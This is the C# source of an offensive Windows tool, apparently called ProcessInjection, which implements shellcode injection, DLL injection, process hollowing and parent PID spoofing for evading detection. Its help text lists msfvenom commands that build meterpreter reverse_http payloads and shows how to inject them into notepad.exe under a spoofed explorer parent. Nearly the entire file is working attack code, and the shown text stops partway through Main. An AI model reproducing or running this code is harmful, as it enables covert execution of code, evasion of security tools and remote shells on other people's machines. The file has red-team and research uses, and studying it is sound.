using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Diagnostics;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);

        [DllImport("Kernel32", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("Kernel32", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("Kernel32", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        #region DLL Injection
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandleA(string lpModuleName);

        [DllImport("kernel32", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        #endregion DLL Injection

        #region Process Hollowing
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        #endregion Process Hollowing

        #region Parent PID Spoofing
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask, HANDLE_FLAGS dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
        #endregion Parent PID Spoofing

        //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        //https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }

        // https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
        public enum MemOpenThreadAccess
        {

            PROCESS_CREATE_THREAD = 0x0002,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_OPERATION = 0x0008,
            PROCESS_VM_WRITE = 0x0020,
            PROCESS_VM_READ = 0x0010,
            SUSPEND_RESUME = 0x0002,
        }

        #region Parent PID Spoofing Structs and flags
        // Parent PID Spoofing flags - https://www.pinvoke.net/default.aspx/kernel32.sethandleinformation
        enum HANDLE_FLAGS : uint
        {
            None = 0,
            INHERIT = 1,
            PROTECT_FROM_CLOSE = 2
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
        #endregion Parent PID Spoofing structs and flags

        #region Process Hollowing Structs
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        //internal struct STARTUPINFO
        public struct STARTUPINFO
        {
            uint cb;
            IntPtr lpReserved;
            IntPtr lpDesktop;
            IntPtr lpTitle;
            uint dwX;
            uint dwY;
            uint dwXSize;
            uint dwYSize;
            uint dwXCountChars;
            uint dwYCountChars;
            uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            ushort cbReserved;
            IntPtr lpReserved2;
            IntPtr hStdInput;
            IntPtr hStdOutput;
            IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_INFO
        {
            public uint dwOem;
            public uint dwPageSize;
            public IntPtr lpMinAppAddress;
            public IntPtr lpMaxAppAddress;
            public IntPtr dwActiveProcMask;
            public uint dwNumProcs;
            public uint dwProcType;
            public uint dwAllocGranularity;
            public ushort wProcLevel;
            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }
        #endregion End of Process Hollowing Structs

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public static byte[] convertfromc(string val)
        {
            string rval = val.Replace("\"", string.Empty).Replace("\r\n", string.Empty).Replace("x", string.Empty);
            string[] sval = rval.Split('\\');

            var fval = string.Empty;
            foreach (var lval in sval)
            {
                if (lval != null)
                {
                    fval += lval;
                }
            }

            return StringToByteArray(fval);
        }

        public static void CodeInject(int pid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;
                uint lpThreadId = 0;
                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
                Console.WriteLine($"[+] Allocating memory to inject the shellcode.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine($"[+] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
                Console.WriteLine($"[+] Writing the shellcode at the allocated memory location.");
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] Shellcode written in the process memory.");
                    Console.WriteLine($"[+] Creating remote thread to execute the shellcode.");
                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);
                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
                    Console.WriteLine($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    Console.WriteLine($"[+] Failed to inject the shellcode into the memory of the process id {pid}.");
                }
                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
        }


        public static void DLLInject(int pid, byte[] buf)
        {
            try
            {
                uint lpNumberOfBytesWritten = 0;
                uint lpThreadId = 0;
                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
                IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
                Console.WriteLine($"[+] {loadLibraryAddr} is the address of the LoadLibraryA exported function.");
                Console.WriteLine($"[+] Allocating memory for the DLL path.");
                IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine($"[+] Memory for injecting DLL path is allocated at 0x{rMemAddress}.");
                Console.WriteLine($"[+] Writing the DLL path at the allocated memory location.");
                if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] DLL path written in the target process memory.");
                    Console.WriteLine($"[+] Creating remote thread to execute the DLL.");
                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId);
                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
                    Console.WriteLine($"[+] Sucessfully injected the DLL into the memory of the process id {pid}.");
                }
                else
                {
                    Console.WriteLine($"[+] Failed to inject the DLL into the memory of the process id {pid}.");
                }
                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                bool hOpenProcessClose = CloseHandle(pHandle);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
        }

        public class ProcHollowing
        {
            /*
            Credits goes to Aaron - https://github.com/ambray,  Michael Gorelik<smgorelik@gmail.com> and @_RastaMouse
            https://github.com/ambray/ProcessHollowing
            https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
            https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Hollower.cs
            */

            IntPtr section_;
            IntPtr localmap_;
            IntPtr remotemap_;
            IntPtr localsize_;
            IntPtr remotesize_;
            IntPtr pModBase_;
            IntPtr pEntry_;
            uint rvaEntryOffset_;
            uint size_;
            byte[] inner_;
            public const uint PageReadWriteExecute = 0x40;
            public const uint PageReadWrite = 0x04;
            public const uint PageExecuteRead = 0x20;
            public const uint MemCommit = 0x00001000;
            public const uint SecCommit = 0x08000000;
            public const uint GenericAll = 0x10000000;
            public const uint CreateSuspended = 0x00000004;
            public const uint DetachedProcess = 0x00000008;
            public const uint CreateNoWindow = 0x08000000;
            private const ulong PatchSize = 0x10;

            public uint round_to_page(uint size)
            {
                SYSTEM_INFO info = new SYSTEM_INFO();

                GetSystemInfo(ref info);

                return (info.dwPageSize - size % info.dwPageSize) + size;
            }

            const int AttributeSize = 24;

            private bool nt_success(long v)
            {
                return (v >= 0);
            }

            public IntPtr GetCurrent()
            {
                return GetCurrentProcess();
            }


            public static PROCESS_INFORMATION StartProcess(string binaryPath)
            {
                uint flags = CreateSuspended;

                STARTUPINFO startInfo = new STARTUPINFO();
                PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
                CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);

                Console.WriteLine($"[+] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");

                return procInfo;
            }

            /*
            https://github.com/peperunas/injectopi/tree/master/CreateSection
            Attemp to create executatble section
            */
            public bool CreateSection(uint size)
            {
                LARGE_INTEGER liVal = new LARGE_INTEGER();
                size_ = round_to_page(size);
                liVal.LowPart = size_;

                long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);
                Console.WriteLine($"[+] Executable section created.");
                return nt_success(status);
            }

            public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
            {
                IntPtr baseAddr = addr;
                IntPtr viewSize = (IntPtr)size_;

                long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
                return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
            }

            public void SetLocalSection(uint size)
            {

                KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
                Console.WriteLine($"[+] Map view section to the current process: {vals}.");
                localmap_ = vals.Key;
                localsize_ = vals.Value;

            }

            public void CopyShellcode(byte[] buf)
            {
                long lsize = size_;
                Console.WriteLine($"[+] Copying Shellcode into section: {lsize}. ");

                unsafe
                {
                    byte* p = (byte*)localmap_;

                    for (int i = 0; i < buf.Length; i++)
                    {
                        p[i] = buf[i];
                    }
                }
            }

            public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
            {
                int i = 0;
                IntPtr ptr;

                ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);
                Console.WriteLine($"[+] Preparing shellcode patch for the new process entry point: {ptr}. ");

                unsafe
                {
                    byte* p = (byte*)ptr;
                    byte[] tmp = null;

                    if (IntPtr.Size == 4)
                    {
                        p[i] = 0xb8;
                        i++;
                        Int32 val = (Int32)dest;
                        tmp = BitConverter.GetBytes(val);
                    }
                    else
                    {
                        p[i] = 0x48;
                        i++;
                        p[i] = 0xb8;
                        i++;

                        Int64 val = (Int64)dest;
                        tmp = BitConverter.GetBytes(val);
                    }

                    for (int j = 0; j < IntPtr.Size; j++)
                        p[i + j] = tmp[j];

                    i += IntPtr.Size;
                    p[i] = 0xff;
                    i++;
                    p[i] = 0xe0;
                    i++;
                }

                return new KeyValuePair<int, IntPtr>(i, ptr);
            }

            private IntPtr GetEntryFromBuffer(byte[] buf)
            {
                Console.WriteLine($"[+] Locating the entry point for the main module in remote process.");
                IntPtr res = IntPtr.Zero;
                unsafe
                {
                    fixed (byte* p = buf)
                    {
                        uint e_lfanew_offset = *((uint*)(p + 0x3c));

                        byte* nthdr = (p + e_lfanew_offset);

                        byte* opthdr = (nthdr + 0x18);

                        ushort t = *((ushort*)opthdr);

                        byte* entry_ptr = (opthdr + 0x10);

                        int tmp = *((int*)entry_ptr);

                        rvaEntryOffset_ = (uint)tmp;

                        if (IntPtr.Size == 4)
                            res = (IntPtr)(pModBase_.ToInt32() + tmp);
                        else
                            res = (IntPtr)(pModBase_.ToInt64() + tmp);

                    }
                }

                pEntry_ = res;
                return res;
            }

            public IntPtr FindEntry(IntPtr hProc)
            {
                PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
                uint tmp = 0;

                long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
                Console.WriteLine($"[+] Locating the module base address in the remote process.");

                IntPtr readLoc = IntPtr.Zero;
                byte[] addrBuf = new byte[IntPtr.Size];
                if (IntPtr.Size == 4)
                {
                    readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
                }
                else
                {
                    readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
                }

                IntPtr nRead = IntPtr.Zero;

                ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);

                if (IntPtr.Size == 4)
                    readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
                else
                    readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                pModBase_ = readLoc;

                ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
                Console.WriteLine($"[+] Read the first page and locate the entry point: {readLoc}.");

                return GetEntryFromBuffer(inner_);
            }

            public void MapAndStart(PROCESS_INFORMATION pInfo)
            {

                KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
                Console.WriteLine($"[+] Locate shellcode into the suspended remote porcess: {tmp}.");

                remotemap_ = tmp.Key;
                remotesize_ = tmp.Value;

                KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);

                try
                {

                    IntPtr pSize = (IntPtr)patch.Key;
                    IntPtr tPtr = new IntPtr();

                    WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);

                }
                finally
                {
                    if (patch.Value != IntPtr.Zero)
                        Marshal.FreeHGlobal(patch.Value);
                }

                byte[] tbuf = new byte[0x1000];
                IntPtr nRead = new IntPtr();
                ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);

                uint res = ResumeThread(pInfo.hThread);
                Console.WriteLine($"[+] Process has been resumed.");

            }

            public IntPtr GetBuffer()
            {
                return localmap_;
            }

            ~ProcHollowing()
            {
                if (localmap_ != (IntPtr)0)
                    ZwUnmapViewOfSection(section_, localmap_);
            }

            public void Hollow(string binary, byte[] shellcode)
            {
                PROCESS_INFORMATION pinf = StartProcess(binary);
                CreateSection((uint)shellcode.Length);
                FindEntry(pinf.hProcess);
                SetLocalSection((uint)shellcode.Length);
                CopyShellcode(shellcode);
                MapAndStart(pinf);
                CloseHandle(pinf.hThread);
                CloseHandle(pinf.hProcess);
            }

            public ProcHollowing()
            {
                section_ = new IntPtr();
                localmap_ = new IntPtr();
                remotemap_ = new IntPtr();
                localsize_ = new IntPtr();
                remotesize_ = new IntPtr();
                inner_ = new byte[0x1000];
            }

        }

        public class ParentPidSpoofing
        {
            // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch
            
            public int SearchForPPID(string process)
            {
                int pid = 0;
                int session = Process.GetCurrentProcess().SessionId;
                Process[] allprocess = Process.GetProcessesByName(process);

                try
                {
                    foreach(Process proc in allprocess)
                    {
                        if (proc.SessionId == session)
                        {
                            pid = proc.Id;
                            Console.WriteLine($"[+] Parent process ID found: {pid}.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                    Console.WriteLine(ex.Message);
                }
                return pid;
            }

            public PROCESS_INFORMATION ParentSpoofing(int parentID, string childPath)
            {
                // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch
                const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
                const int STARTF_USESTDHANDLES = 0x00000100;
                const int STARTF_USESHOWWINDOW = 0x00000001;
                const ushort SW_HIDE = 0x0000;
                const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
                const uint CREATE_NO_WINDOW = 0x08000000;
                const uint CreateSuspended = 0x00000004;

                var pInfo = new PROCESS_INFORMATION();
                var siEx = new STARTUPINFOEX();

                IntPtr lpValueProc = IntPtr.Zero;
                IntPtr hSourceProcessHandle = IntPtr.Zero;
                var lpSize = IntPtr.Zero;

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);

                IntPtr parentHandle = OpenProcess((uint)ProcessAccessRights.CreateProcess | (uint)ProcessAccessRights.DuplicateHandle, false, (uint)parentID);
                Console.WriteLine($"[+] Handle {parentHandle} opened for parent process id.");

                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, parentHandle);

                UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
                Console.WriteLine($"[+] Adding attributes to a list.");

                siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
                siEx.StartupInfo.wShowWindow = SW_HIDE;

                var ps = new SECURITY_ATTRIBUTES();
                var ts = new SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);

               try
                {
                    bool ProcCreate = CreateProcess(childPath, null, ref ps, ref ts, true, CreateSuspended | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
                    if (!ProcCreate)
                    {
                        Console.WriteLine($"[+] Proccess failed to execute!");

                    }
                    Console.WriteLine($"[+] New process with ID: {pInfo.dwProcessId} created in a suspended stated under the defined parent process.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                    Console.WriteLine(ex.Message);
                }
                return pInfo;
            }

            public void PPidSpoof(string binary, byte[] shellcode, int parentpid)
            {
                PROCESS_INFORMATION pinf = ParentSpoofing(parentpid, binary);
                ProcHollowing hollow = new ProcHollowing();
                hollow.CreateSection((uint)shellcode.Length);
                hollow.FindEntry(pinf.hProcess);
                hollow.SetLocalSection((uint)shellcode.Length);
                hollow.CopyShellcode(shellcode);
                hollow.MapAndStart(pinf);
                CloseHandle(pinf.hThread);
                CloseHandle(pinf.hProcess);
            }
        }

        public static void PPIDCodeInject(string binary, byte[] shellcode, int parentpid)
        {
            ParentPidSpoofing Parent = new ParentPidSpoofing();
            PROCESS_INFORMATION pinf = Parent.ParentSpoofing(parentpid, binary);
            CodeInject(pinf.dwProcessId, shellcode);
        }

        public static void PPIDDLLInject(string binary, byte[] shellcode, int parentpid)
        {
            ParentPidSpoofing Parent = new ParentPidSpoofing();
            PROCESS_INFORMATION pinf = Parent.ParentSpoofing(parentpid, binary);
            DLLInject(pinf.dwProcessId, shellcode);
        }

        public static void logo()
        {
            Console.WriteLine();
            Console.WriteLine("################################################################################################");
            Console.WriteLine("#  ____  ____   ___   ____ _____ ____ ____    ___ _   _     _ _____ ____ _____ ___ ___  _   _  #");
            Console.WriteLine("# |  _ \\|  _ \\ / _ \\ / ___| ____/ ___/ ___|  |_ _| \\ | |   | | ____/ ___|_   _|_ _/ _ \\| \\ | | #");
            Console.WriteLine("# | |_) | |_) | | | | |   |  _| \\___ \\___ \\   | ||  \\| |_  | |  _|| |     | |  | | | | |  \\| | #");
            Console.WriteLine("# |  __/|  _ <| |_| | |___| |___ ___) |__) |  | || |\\  | |_| | |__| |___  | |  | | |_| | |\\  | #");
            Console.WriteLine("# |_|   |_| \\_\\\\___/ \\____|_____|____/____/  |___|_| \\_|\\___/|_____\\____| |_| |___\\___/|_| \\_| #");
            Console.WriteLine("#                                                                                              #");
            Console.WriteLine("################################################################################################");
            Console.WriteLine();

        }

        public static void help()
        {

            string help = @"
*****************Help*****************
[+] The program is designed to perform process injection.
[+] Currently the tool supports 3 process injection techniques.
    1) Vanila Process Injection
    2) DLL Injection
    3) Process Hollowing

[+] Vanila Process Injection and Process Hollowing.
[+] Currently the tool accepts shellcode in 3 formats.
    1) base64
    2) hex
    3) C

[+] Supports 1 detection evading technique.
    1) Parent PID Spoofing

[+] Generating shellcode in base64 format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" | base64
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:base64 /t:1

[+] Generating shellcode in hex format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f hex
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:hex /t:1

[+] Generating shellcode in c format and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:1

[+] DLL Injection
[+] Generating DLL and injecting it in the target process.
[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f dll > Desktop/calc.dll
[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\calc.dll"" /t:2

[+] Process Hollowing
[+] Generating shellcode in c format and injecting it in the target process.
[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3

[+] Detection Evading Technique

[+] Parent PID Spoofing with Vanila Process Injection.
[+] Generating shellcode in c format and injecting it in the target process.
[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:4

[+] Parent PID Spoofing with DLL Injection.
[+] Generating DLL and injecting it in the target process.
[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f dll > Desktop/reverse_shell.dll
[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\reverse_shell.dll"" /parentproc:explorer /t:5

[+] Parent PID Spoofing with Process Hollowing.
[+] Generating shellcode in c format and injecting it in the target process.
[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:6

";
            Console.WriteLine(help);
        }
        static void Main(string[] args)
        {
            try
            {
                logo();
                // https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Domain/ArgumentParser.cs#L10

                var arguments = new Dictionary<string, string>();
                foreach (var argument in args)
                {
                    var idx = argument.IndexOf(':');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                    else
                        arguments[argument] = string.Empty;
                }

                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                {
